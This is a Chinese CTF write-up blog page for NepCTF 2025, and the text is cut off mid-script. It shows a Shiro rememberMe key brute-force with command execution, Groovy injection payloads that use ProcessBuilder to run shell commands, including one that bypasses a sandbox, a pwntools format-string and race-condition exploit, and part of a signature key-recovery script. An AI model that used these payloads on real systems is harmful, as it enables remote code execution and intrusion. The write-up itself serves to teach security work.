<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025nepctf--wp | Jiker's blog</title><meta name="author" content="Jiker."><meta name="copyright" content="Jiker."><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="NepCTF——wpwebJavaSeri进入网站发现进不去  由题目在后面加上&#x2F;login.jsp得到  看到remember me就知道是shiro框架所以使用这个工具可以爆破出key  得到key是kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;然后我们爆破利用链以及回显得到  最终我们可以在命令执行中输入env得到flag  FLAG&#x3D;flag{97">
<meta property="og:type" content="article">
<meta property="og:title" content="2025nepctf--wp">
<meta property="og:url" content="https://jiker666.github.io/2025/07/29/NepCTF%E2%80%94%E2%80%94wp%2023ecfd63eb56801d861ffbd04c7dc873/index.html">
<meta property="og:site_name" content="Jiker&#39;s blog">
<meta property="og:description" content="NepCTF——wpwebJavaSeri进入网站发现进不去  由题目在后面加上&#x2F;login.jsp得到  看到remember me就知道是shiro框架所以使用这个工具可以爆破出key  得到key是kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;然后我们爆破利用链以及回显得到  最终我们可以在命令执行中输入env得到flag  FLAG&#x3D;flag{97">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://jiker666.github.io/img/butterfly-icon.png">
<meta property="article:published_time" content="2025-07-29T03:33:19.000Z">
<meta property="article:modified_time" content="2025-07-29T03:41:43.705Z">
<meta property="article:author" content="Jiker.">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jiker666.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "2025nepctf--wp",
  "url": "https://jiker666.github.io/2025/07/29/NepCTF%E2%80%94%E2%80%94wp%2023ecfd63eb56801d861ffbd04c7dc873/",
  "image": "https://jiker666.github.io/img/butterfly-icon.png",
  "datePublished": "2025-07-29T03:33:19.000Z",
  "dateModified": "2025-07-29T03:41:43.705Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jiker.",
      "url": "https://jiker666.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://jiker666.github.io/2025/07/29/NepCTF%E2%80%94%E2%80%94wp%2023ecfd63eb56801d861ffbd04c7dc873/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2025nepctf--wp',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Jiker's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">2025nepctf--wp</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">2025nepctf--wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-29T03:33:19.000Z" title="发表于 2025-07-29 11:33:19">2025-07-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-29T03:41:43.705Z" title="更新于 2025-07-29 11:41:43">2025-07-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="NepCTF——wp"><a href="#NepCTF——wp" class="headerlink" title="NepCTF——wp"></a>NepCTF——wp</h1><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="JavaSeri"><a href="#JavaSeri" class="headerlink" title="JavaSeri"></a><strong>JavaSeri</strong></h2><p>进入网站发现进不去</p>
<p><img src="/image.png" alt="image.png"></p>
<p>由题目在后面加上&#x2F;login.jsp得到</p>
<p><img src="/image%201.png" alt="image.png"></p>
<p>看到remember me就知道是shiro框架<br>所以使用这个工具可以爆破出key</p>
<p><img src="/image%202.png" alt="image.png"></p>
<p>得到key是kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;<br>然后我们爆破利用链以及回显得到</p>
<p><img src="/image%203.png" alt="image.png"></p>
<p>最终我们可以在命令执行中输入env得到flag</p>
<p><img src="/image%204.png" alt="image.png"></p>
<p>FLAG&#x3D;flag{97353f93-7cec-1101-792e-9bf387095d95}</p>
<h2 id="easyGooGooVVVY"><a href="#easyGooGooVVVY" class="headerlink" title="easyGooGooVVVY"></a><strong>easyGooGooVVVY</strong></h2><p>看到这个题目就知道核心场景是Groovy表达式注入：页面提供输入框，允许用户提交 Groovy代码并执行。目标是利用该特性，读取服务器环境变量中的FLAG。</p>
<p><img src="/image%205.png" alt="image.png"></p>
<p>二、漏洞原理</p>
<p>Groovy是运行在JVM上的动态语言，天然支持调用Java标准库。若应用未对用户输入的Groovy代码做严格校验，攻击者可注入恶意代码，通过JavaAPI（如ProcessBuilder）执行系统命令，从而窃取敏感信息（如环境变量、文件内容等）。</p>
<p>三、利用过程</p>
<ol>
<li>目标分析</li>
</ol>
<p>服务器环境中，FLAG通常存储为环境变量。通过执行Shell命令echo $FLAG即可读取其值。</p>
<ol>
<li>构造 Groovy payload</li>
</ol>
<p>利用Java的ProcessBuilder类执行Shell命令，步骤如下：</p>
<p>&#x2F;&#x2F;1.创建进程构建器，指定要执行的Shell命令：</p>
<p>echo $FLAGdef pb &#x3D; new ProcessBuilder([‘sh’,’-c’,’echo $FLAG’])</p>
<p>&#x2F;&#x2F;2.启动进程，开始执行命令</p>
<p>def proc &#x3D; pb.start()</p>
<p>&#x2F;&#x2F;3.等待进程执行完毕（确保输出完整）</p>
<p>proc.waitFor()</p>
<p>&#x2F;&#x2F; 4. 读取进程的标准输出（即命令结果），并去除首尾空白</p>
<p>def content &#x3D; proc.inputStream.text.trim()</p>
<p>&#x2F;&#x2F;5.返回结果，使页面显示FLAG</p>
<p>content</p>
<p>我们将这个代码放到输入框中得到flag</p>
<p><img src="/image%206.png" alt="image.png"></p>
<p>得到flag{a27f0eff-0ac2-3d0a-01ed-486fc1b1ec01}</p>
<h2 id="RevengeGooGooVVVY"><a href="#RevengeGooGooVVVY" class="headerlink" title="RevengeGooGooVVVY"></a><strong>RevengeGooGooVVVY</strong></h2><p>分析题目：本题延续Groovy 表达式注入场景，但新增两个沙盒净化类（Phase3Purifiler和CustomGroovyPurifiler），意图限制危险操作。我们继续分析这两个文件：</p>
<p>1. Phase3Purifiler.java（AST 转换拦截）</p>
<p>绕过点：本题未使用注解，直接调用Java原生类ProcessBuilder，避开 AST 转换检测。</p>
<p>2. CustomGroovyPurifiler.java（方法调用沙盒）</p>
<p>仅拦截方法名为execute的调用（如String.execute()），未拦截ProcessBuilder.start()（方法名不同）。</p>
<p>ProcessBuilder属于Java原生类，沙盒未对其构造和调用做限制。</p>
<p>所以由此我们可以构造出一个合法的ProcessBuilder调用</p>
<p>如下：</p>
<p><strong>def pb &#x3D; new ProcessBuilder([‘sh’, ‘-c’, ‘echo $FLAG’])</strong></p>
<p><strong>&#x2F;&#x2F;调用Java原生类，非Groovy特有方法</strong></p>
<p><strong>def proc &#x3D; pb.start()</strong></p>
<p><strong>&#x2F;&#x2F;核心：使用start()而非execute()，绕过沙盒规则2</strong></p>
<p><strong>proc.waitFor()</strong></p>
<p><strong>&#x2F;&#x2F;等待命令执行完成</strong></p>
<p><strong>def content &#x3D; proc.inputStream.text.trim()</strong></p>
<p><strong>&#x2F;&#x2F;读取输出，trim()在String白名单中（因白名单包含所有方法）content</strong></p>
<p><strong>&#x2F;&#x2F;返回FLAG</strong></p>
<p>我们将这段代码放入输入框得到flag</p>
<p><img src="/image%207.png" alt="image.png"></p>
<p>得到NepCTF{f1ebb102-4cd7-e79a-a59e-bdeb8f39984e}</p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Time"><a href="#Time" class="headerlink" title="Time"></a><strong>Time</strong></h2><p>正常ida打开找到主程序</p>
<p><img src="/image%208.png" alt="image.png"></p>
<p><img src="/image%209.png" alt="image.png"></p>
<p><img src="/image%2010.png" alt="image.png"></p>
<p><img src="/image%2011.png" alt="image.png"></p>
<p>发现printf(format_);格式化漏洞，但是限制字符不能有flag，所以刚好对应上题目time，利用时间写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ELF文件可选加载</span></span><br><span class="line">_<span class="built_in">bin</span> = ELF(<span class="string">&quot;./time&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选本地调试：</span></span><br><span class="line"><span class="comment"># io = process(_bin.path)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程 TLS 连接</span></span><br><span class="line">io = remote(<span class="string">&quot;nepctf32-lzta-hb4o-3qpb-srvc9jeja259.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="literal">True</span>, typ=<span class="string">&#x27;tcp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.update(arch=_<span class="built_in">bin</span>.arch, os=_<span class="built_in">bin</span>.os, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化字符串泄露信息（注意偏移是构造链 %28$p ~ %22$p）</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span>.join([<span class="string">f&#x27;%<span class="subst">&#123;i&#125;</span>$p&#x27;</span>.encode() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>, <span class="number">21</span>, -<span class="number">1</span>)])</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多轮探测竞态</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2048</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;hint.txt&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = io.recv(timeout=<span class="number">0.06</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> resp <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">b&#x27;flag&#x27;</span>, <span class="string">b&#x27;CTF&#123;&#x27;</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Round <span class="subst">&#123;<span class="built_in">round</span>&#125;</span> Get: <span class="subst">&#123;resp.decode(errors=<span class="string">&quot;ignore&quot;</span>).strip()&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到b’hello (nil)0xa7d3134640x36346462313635630x382d343063302d660x3862372d306636330x2d316166616233380x647b46544370654e ,your file read done!\n’</p>
<p>需要去转字符串</p>
<p><img src="/image%2012.png" alt="image.png"></p>
<p>发现是反转了，大厨直接出</p>
<p><img src="/image%2013.png" alt="image.png"></p>
<p>得到NepCTF{d83bafa1-36f0-7b8f-0c04-8c561bd46d41}</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Nepsign"><a href="#Nepsign" class="headerlink" title="Nepsign"></a><strong>Nepsign</strong></h2><p>签到题，是我最喜欢的国密算法SM3，写个脚本直接出</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3 <span class="keyword">as</span> gmssl_sm3</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line"># 定义<span class="title class_">SM3</span>函数</span><br><span class="line">def <span class="title class_">SM3</span>(data):</span><br><span class="line">    data = <span class="title function_">bytes</span>(data)</span><br><span class="line">    data_list = <span class="title function_">list</span>(data)</span><br><span class="line">    h = gmssl_sm3.<span class="title function_">sm3_hash</span>(data_list)</span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line">def <span class="title class_">SM3</span>_n(data, n=<span class="number">1</span>, bits=<span class="number">256</span>):</span><br><span class="line">    data_bin = data</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(n):</span><br><span class="line">        data_hex = <span class="title class_">SM3</span>(data_bin)</span><br><span class="line">        data_bin = binascii.<span class="title function_">unhexlify</span>(data_hex.<span class="title function_">encode</span>())</span><br><span class="line">    hex_str = data_bin.<span class="title function_">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> hex_str[:bits <span class="comment">// 4]</span></span><br><span class="line"></span><br><span class="line">hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"># 创建安全的<span class="variable constant_">SSL</span>连接</span><br><span class="line">def <span class="title function_">create_ssl_connection</span>(host, port, max_retries=<span class="number">3</span>, timeout=<span class="number">20</span>):</span><br><span class="line">    context = ssl.<span class="title function_">create_default_context</span>()</span><br><span class="line">    context.<span class="property">check_hostname</span> = <span class="title class_">False</span></span><br><span class="line">    context.<span class="property">verify_mode</span> = ssl.<span class="property">CERT_NONE</span></span><br><span class="line">    # 设置更现代的加密套件和协议</span><br><span class="line">    context.<span class="property">options</span> |= ssl.<span class="property">OP_NO_SSLv2</span></span><br><span class="line">    context.<span class="property">options</span> |= ssl.<span class="property">OP_NO_SSLv3</span></span><br><span class="line">    context.<span class="property">options</span> |= ssl.<span class="property">OP_NO_TLSv1</span></span><br><span class="line">    context.<span class="property">options</span> |= ssl.<span class="property">OP_NO_TLSv1_1</span></span><br><span class="line">    context.<span class="title function_">set_ciphers</span>(<span class="string">&#x27;ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(max_retries):</span><br><span class="line">        <span class="attr">try</span>:</span><br><span class="line">            # 创建<span class="variable constant_">TCP</span>套接字</span><br><span class="line">            sock = socket.<span class="title function_">create_connection</span>((host, port), timeout=timeout)</span><br><span class="line">            # 包装<span class="variable constant_">SSL</span>套接字</span><br><span class="line">            ssock = context.<span class="title function_">wrap_socket</span>(sock, server_hostname=host)</span><br><span class="line">            ssock.<span class="title function_">settimeout</span>(timeout)</span><br><span class="line">            <span class="keyword">return</span> ssock</span><br><span class="line">        except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">            <span class="title function_">print</span>(f<span class="string">&quot;连接尝试 &#123;i + 1&#125; 失败: &#123;e&#125;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> i &lt; max_retries - <span class="number">1</span>:</span><br><span class="line">                time.<span class="title function_">sleep</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">None</span></span><br><span class="line"></span><br><span class="line"># 连接服务器</span><br><span class="line">host = <span class="string">&#x27;nepctf31-7cvo-yss2-jzpq-wd53jtut5307.nepctf.com&#x27;</span></span><br><span class="line">port = <span class="number">443</span></span><br><span class="line"></span><br><span class="line"><span class="attr">try</span>:</span><br><span class="line">    ssock = <span class="title function_">create_ssl_connection</span>(host, port)</span><br><span class="line">    <span class="keyword">if</span> not <span class="attr">ssock</span>:</span><br><span class="line">        <span class="title function_">print</span>(<span class="string">&quot;无法建立SSL连接&quot;</span>)</span><br><span class="line">        sys.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    # 创建pwntools远程对象</span><br><span class="line">    r = remote.<span class="title function_">fromsocket</span>(ssock)</span><br><span class="line">    # 设置日志级别</span><br><span class="line">    context.<span class="property">log_level</span> = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;正在接收初始化信息...&quot;</span>)</span><br><span class="line">    data = r.<span class="title function_">recvuntil</span>(b<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> b<span class="string">&#x27;initializing&#x27;</span> <span class="keyword">in</span> <span class="attr">data</span>:</span><br><span class="line">        <span class="title function_">print</span>(<span class="string">&quot;连接成功&quot;</span>)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        <span class="title function_">print</span>(<span class="string">&quot;未收到预期响应&quot;</span>)</span><br><span class="line">        <span class="title function_">print</span>(f<span class="string">&quot;收到数据: &#123;data&#125;&quot;</span>)</span><br><span class="line">        sys.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line">except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">    <span class="title function_">print</span>(f<span class="string">&quot;连接失败: &#123;e&#125;&quot;</span>)</span><br><span class="line">    sys.<span class="title function_">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"># 存储恢复的私钥</span><br><span class="line">sk_recovered = [<span class="title class_">None</span>] * <span class="number">48</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;开始恢复私钥(0-31)...&quot;</span>)</span><br><span class="line"># 恢复私钥: 前<span class="number">32</span>个索引 (k=<span class="number">0</span> 到 <span class="number">31</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="title class_">True</span>:</span><br><span class="line">        <span class="attr">try</span>:</span><br><span class="line">            # 生成随机消息</span><br><span class="line">            msg_bytes = os.<span class="title function_">urandom</span>(<span class="number">10</span>)</span><br><span class="line">            msg_hex = msg_bytes.<span class="title function_">hex</span>()</span><br><span class="line">            # 计算<span class="title class_">SM3</span>哈希</span><br><span class="line">            m_hex = <span class="title class_">SM3</span>(msg_bytes)</span><br><span class="line">            # 检查第k个字节是否为<span class="number">00</span></span><br><span class="line">            <span class="keyword">if</span> m_hex[<span class="number">2</span> * <span class="attr">k</span>:<span class="number">2</span> * k + <span class="number">2</span>] == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">                # 请求签名</span><br><span class="line">                r.<span class="title function_">sendline</span>(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                r.<span class="title function_">recvuntil</span>(b<span class="string">&#x27;msg: &#x27;</span>)</span><br><span class="line">                r.<span class="title function_">sendline</span>(msg_hex.<span class="title function_">encode</span>())</span><br><span class="line">                sig_line = r.<span class="title function_">recvline</span>().<span class="title function_">decode</span>().<span class="title function_">strip</span>()</span><br><span class="line">                # 确保接收到提示符</span><br><span class="line">                <span class="attr">try</span>:</span><br><span class="line">                    r.<span class="title function_">recvuntil</span>(b<span class="string">&#x27;&gt;&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">                <span class="attr">except</span>:</span><br><span class="line">                    pass</span><br><span class="line"></span><br><span class="line">                # 解析签名列表</span><br><span class="line">                <span class="attr">try</span>:</span><br><span class="line">                    qq_list = ast.<span class="title function_">literal_eval</span>(sig_line)</span><br><span class="line">                    sk_recovered[k] = bytes.<span class="title function_">fromhex</span>(qq_list[k])</span><br><span class="line">                    <span class="title function_">print</span>(f<span class="string">&quot;成功恢复私钥[&#123;k&#125;]&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">                    <span class="title function_">print</span>(f<span 